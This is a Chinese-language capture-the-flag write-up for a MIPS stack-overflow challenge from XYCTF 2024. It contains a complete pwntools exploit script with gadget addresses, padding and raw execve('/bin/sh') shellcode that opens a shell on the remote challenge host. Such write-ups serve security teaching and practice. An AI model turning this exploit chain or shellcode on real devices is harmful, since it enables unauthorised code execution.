# EZ1.0?

> 分类：Pwn

## 题目描述
MIPS 架构 PWN。写 shellcode 到栈上，通过还原寄存器让 fp 得到 jmp_a2 的 gadget，再 return 到 sp2a2_jmp_fp 的 gadget 上，使 a2=sp+偏移并跳到 fp 执行 jmp_a2，最终 jmp 到栈上 shellcode。

## 考察知识点
- MIPS 汇编
- 栈溢出
- 寄存器还原 / gadget 链
- 执行栈上 shellcode

## 解法
写 shellcode 到栈上，通过还原寄存器构造 jmp 链执行 shellcode。shellcode 来源：https://shell-storm.org/shellcode/files/shellcode-80.html

```python
from pwn import *

context(arch='mips',endian='little',os='linux')

#sh = process(["qemu-mipsel",'-g','1234',"./mips"])
sh = remote('python',11025)
sh.recvuntil(b'welcome XYCTF mips world\n')

sp2a2_jmp_fp = 0x00427968
jmp_a2 = 0x0041FBF4

shellcode =  b'\xff\xff\x10\x04\xab\x0f\x02\x24'
shellcode += b'\x55\xf0\x46\x20\x66\x06\xff\x23'
shellcode += b'\xc2\xf9\xec\x23\x66\x06\xbd\x23'
shellcode += b'\x9a\xf9\xac\xaf\x9e\xf9\xa6\xaf'
shellcode += b'\x9a\xf9\xbd\x23\x21\x20\x80\x01'
shellcode += b'\x21\x28\xa0\x03\xcc\xcd\x44\x03'
shellcode += b'/bin/sh'

shellcode =  b'\x50\x73\x06\x24\xff\xff\xd0\x04\x50\x73\x0f\x24\xff\xff\x06\x28'
shellcode += b'\xe0\xff\xbd\x27\xd7\xff\x0f\x24\x27\x78\xe0\x01\x21\x20\xef\x03'
shellcode += b'\xe8\xff\xa4\xaf\xec\xff\xa0\xaf\xe8\xff\xa5\x23\xab\x0f\x02\x24'
shellcode += b'\x0c\x01\x01\x01/bin/sh'

payload =  b'a'*0x40
payload += p32(jmp_a2)+p32(sp2a2_jmp_fp)
payload += b'a'*0x58 + shellcode

sh.send(payload)
sh.interactive()
```

## 参考答案
（未给出，getshell 后读取）

## 来源
- 作者：jht3 | https://jht3qaq.github.io/2024/04/26/XYCTF2024-Writeup/
